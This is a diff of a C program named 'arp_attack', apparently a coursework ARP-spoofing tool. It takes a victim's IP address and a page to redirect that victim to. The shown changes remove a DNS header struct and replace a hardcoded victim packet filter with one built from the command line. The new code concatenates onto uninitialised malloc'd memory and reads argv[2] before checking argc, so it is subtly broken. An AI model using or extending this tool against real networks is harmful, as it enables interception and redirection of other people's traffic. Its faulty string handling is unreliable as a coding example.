@@ -156,29 +156,9 @@ struct udp_header{
     u_short udp_checksum;           /*UDP check sum*/
 };
 
-struct dns_header{
-    u_short dns_trans_id;                           /*transaction id*/
-    u_char  dns_flag_h;                             /*DNS flag high 8bit*/
-#define DNS_QR(dns) (((dns)->dns_flag_h) & 0x80)    /*DNS type*/
-#define DNS_OPCODE(dns) (((dns)->dns_flag_h) & 0x70)/*DNS message type*/
-#define DNS_AA(dns) (((dns)->dns_flag_h) & 0x04)    /*DNS command answer*/
-#define DNS_TC(dns) (((dns)->dns_flag_h) & 0x02)    /*DNS is cut*/
-#define DNS_RD(dns) (((dns)->dns_flag_h) & 0x01)    /*DNS Resursive service*/
-    u_char  dns_flag_l;                             /*DNS flag low  8bit*/
-#define DNS_RA(dns) (((dns)->dns_flag_l) & 0x80)    /*DNS flag recursion available bit*/
-#define DNS_Z(dns)  (((dns)->dns_flag_l) & 0x70)    /*don't know about this bit*/
-#define DNS_AD(dns) (((dns)->dns_flag_l) & 0x20)    /*DNS flag authenticated data bit*/
-#define DNS_CD(dns) (((dns)->dns_flag_l) & 0x10)    /*DNS flag checking disabled bit*/
-#define DNS_RCODE(dns) (((dns)->dns_flag_l) & 0xF)  /*DNS flag return code*/
-    u_short dns_q_num;                              /*DNS question number*/
-    u_short dns_r_num;                              /*DNS answer number*/
-    u_short dns_ar_num;
-    u_short dns_er_num;
-};
-
 /* Other Global variables */
 const char* if_name;
-char* filter_string = "host 172.16.155.138"; //either gateway or the victim as the host
+char* filter = "host ", *filter_string = NULL;             // use the victim's address for the filter
 char pcap_errbuf[PCAP_ERRBUF_SIZE];
 struct timeval tv, checktv;
 /*Hexadecimal format for the GET requests */
@@ -471,13 +451,17 @@ int ARP_Inject(struct myStruct mystruct, bool packet_type,
 
 int main(int argc, const char* argv[]) {
     //struct timeval tv;
-    struct bpf_program fp;      // holds the compiled program     
-    bpf_u_int32 maskp, netp;          // subnet mask                                
+    filter_string = (char *)malloc(strlen(filter)+strlen(argv[2])+1);       
+    strncat(filter_string, filter, strlen(filter));
+    strncat(filter_string, argv[2], strlen(argv[2]));
+
+    struct bpf_program fp;              // holds the compiled program     
+    bpf_u_int32 maskp, netp;            // subnet mask                                
     int count = 0;
 
     // Get the interface name, target IP address, target_page(liangzk or chanmc) from command line.
     if (argc != 4) {
-        fprintf(stderr, "usage: arp_attack <interface> <victim's-ip-address> <target-page-to-redirect>\n");
+        fprintf(stderr, "usage: arp_attack <interface> <victim's-ip-address> <target_page_to_redirect>\n");
         exit(1);
     }
     memset(&mystruct, 0, sizeof(mystruct)); 
